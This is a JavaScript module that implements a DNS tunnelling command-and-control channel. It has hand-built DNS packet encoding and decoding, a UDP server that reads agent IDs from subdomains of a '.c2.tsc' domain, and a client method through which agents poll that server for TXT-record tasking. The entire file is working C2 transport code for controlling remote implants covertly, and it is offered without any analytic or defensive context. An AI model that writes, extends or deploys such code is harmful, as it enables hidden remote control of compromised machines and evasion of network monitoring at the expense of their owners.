const dgram = require('dgram');

const DNS_C2_DOMAIN = '.c2.tsc';

function encodeDNSName(name) {
  const parts = name.split('.');
  const buf = Buffer.alloc(256);
  let offset = 0;
  for (const part of parts) {
    if (part.length === 0) continue;
    buf[offset++] = part.length;
    buf.write(part, offset);
    offset += part.length;
  }
  buf[offset++] = 0;
  return buf.slice(0, offset);
}

function decodeDNSName(buf, offset) {
  let labels = [];
  let jumped = false;
  let jumps = 0;
  let origOffset = offset;
  while (true) {
    const len = buf[offset];
    if (len === 0) {
      offset++;
      break;
    }
    if ((len & 0xc0) === 0xc0) {
      if (!jumped) {
        origOffset = offset + 2;
      }
      offset = ((len & 0x3f) << 8) | buf[offset + 1];
      jumped = true;
      jumps++;
      if (jumps > 10) break;
      continue;
    }
    offset++;
    labels.push(buf.toString('ascii', offset, offset + len));
    offset += len;
  }
  if (!jumped) {
    return { name: labels.join('.'), newOffset: offset };
  }
  return { name: labels.join('.'), newOffset: origOffset };
}

function buildDNSResponse(query, answers) {
  const header = Buffer.alloc(12);
  query.copy(header, 0, 0, 2);
  header.writeUInt16BE(0x8180, 2);
  header.writeUInt16BE(1, 4);
  header.writeUInt16BE(answers.length, 6);
  header.writeUInt16BE(0, 8);
  header.writeUInt16BE(0, 10);

  const question = query.slice(12, findEndOfQuestion(query, 12));
  const chunks = [header, question];

  for (const answer of answers) {
    const nameEncoded = encodeDNSName(answer.name);
    const rdlen = answer.data.length;
    const rec = Buffer.alloc(nameEncoded.length + 10 + rdlen);
    let off = 0;
    nameEncoded.copy(rec, off); off += nameEncoded.length;
    rec.writeUInt16BE(answer.type === 'TXT' ? 16 : 1, off); off += 2;
    rec.writeUInt16BE(1, off); off += 2;
    rec.writeUInt32BE(answer.ttl || 60, off); off += 4;
    if (answer.type === 'TXT') {
      const txtData = Buffer.from(answer.data, 'utf8');
      rec.writeUInt16BE(txtData.length + 1, off); off += 2;
      rec[off++] = txtData.length;
      txtData.copy(rec, off);
    } else {
      const ip = answer.data.split('.').map(Number);
      rec.writeUInt16BE(4, off); off += 2;
      for (const octet of ip) rec[off++] = octet;
    }
    chunks.push(rec);
  }

  return Buffer.concat(chunks);
}

function findEndOfQuestion(buf, start) {
  let off = start;
  while (true) {
    if (off >= buf.length) return off;
    const len = buf[off];
    if (len === 0) return off + 5;
    if ((len & 0xc0) === 0xc0) return off + 2;
    off += len + 1;
  }
}

function parseDNSQuery(msg, rinfo) {
  if (msg.length < 12) return null;
  const id = msg.readUInt16BE(0);
  const flags = msg.readUInt16BE(2);
  const qdcount = msg.readUInt16BE(4);

  if ((flags & 0x7800) !== 0 || qdcount === 0) return null;

  const { name: qname, newOffset } = decodeDNSName(msg, 12);
  if (!qname) return null;
  const qtype = msg.readUInt16BE(newOffset);
  const qclass = msg.readUInt16BE(newOffset + 2);

  return { id, qname, qtype, qclass, rinfo };
}

function extractAgentIdFromQuery(qname) {
  const lower = qname.toLowerCase();
  if (!lower.endsWith(DNS_C2_DOMAIN)) return null;
  const subdomain = lower.slice(0, -DNS_C2_DOMAIN.length);
  if (!subdomain || subdomain.endsWith('.')) return null;
  const parts = subdomain.split('.');
  return parts[parts.length - 1];
}

function buildDNSQuery(agentId, command) {
  const id = Math.floor(Math.random() * 65535);
  const flags = 0x0100;
  const qdcount = 1;
  const header = Buffer.alloc(12);
  header.writeUInt16BE(id, 0);
  header.writeUInt16BE(flags, 2);
  header.writeUInt16BE(qdcount, 4);
  header.writeUInt16BE(0, 6);
  header.writeUInt16BE(0, 8);
  header.writeUInt16BE(0, 10);

  const domain = `${agentId}.poll.c2.tsc`;
  const encoded = encodeDNSName(domain);
  const qtype = Buffer.alloc(2);
  qtype.writeUInt16BE(16, 0);
  const qclass = Buffer.alloc(2);
  qclass.writeUInt16BE(1, 0);

  return { id, packet: Buffer.concat([header, encoded, qtype, qclass]) };
}

function parseDNSResponse(msg, expectedId) {
  if (msg.length < 12) return [];
  const id = msg.readUInt16BE(0);
  if (id !== expectedId) return [];
  const flags = msg.readUInt16BE(2);
  if ((flags & 0x8000) === 0) return [];
  const ancount = msg.readUInt16BE(6);
  if (ancount === 0) return [];

  const answers = [];
  let offset = 12;
  const { newOffset } = decodeDNSName(msg, offset);
  offset = newOffset + 4;

  for (let i = 0; i < ancount; i++) {
    const { newOffset: nameEnd } = decodeDNSName(msg, offset);
    offset = nameEnd;
    const type = msg.readUInt16BE(offset); offset += 2;
    offset += 2;
    offset += 4;
    const rdlength = msg.readUInt16BE(offset); offset += 2;
    if (type === 16) {
      const txtLen = msg[offset]; offset++;
      const txt = msg.toString('utf8', offset, offset + txtLen);
      answers.push(txt);
      offset += rdlength - 1;
    } else {
      offset += rdlength;
    }
  }
  return answers;
}

class DNSProtocol {
  constructor(port, mode = 'server') {
    this.port = port;
    this.mode = mode;
    this.socket = null;
    this.handlers = [];
  }

  start(callback) {
    this.socket = dgram.createSocket({ type: 'udp4' });
    this.socket.on('message', (msg, rinfo) => {
      const parsed = parseDNSQuery(msg, rinfo);
      if (!parsed) return;
      const agentId = extractAgentIdFromQuery(parsed.qname);
      for (const handler of this.handlers) {
        handler(parsed, agentId, msg);
      }
    });
    this.socket.on('error', (err) => {
      if (callback) callback(err);
    });
    this.socket.bind(this.port, () => {
      if (callback) callback(null);
    });
  }

  onQuery(handler) {
    this.handlers.push(handler);
  }

  sendResponse(queryMsg, rinfo, answers) {
    const response = buildDNSResponse(queryMsg, answers);
    this.socket.send(response, 0, response.length, rinfo.port, rinfo.address);
  }

  sendQuery(agentId, serverAddr, serverPort, callback) {
    const { id, packet } = buildDNSQuery(agentId);
    const timeout = setTimeout(() => {
      if (callback) callback(new Error('DNS query timeout'), []);
    }, 5000);

    this.socket.once('message', (msg) => {
      clearTimeout(timeout);
      const answers = parseDNSResponse(msg, id);
      if (callback) callback(null, answers);
    });

    this.socket.send(packet, 0, packet.length, serverPort, serverAddr);
  }

  stop() {
    if (this.socket) {
      try { this.socket.close(); } catch (e) {}
    }
  }
}

module.exports = { DNSProtocol, extractAgentIdFromQuery };
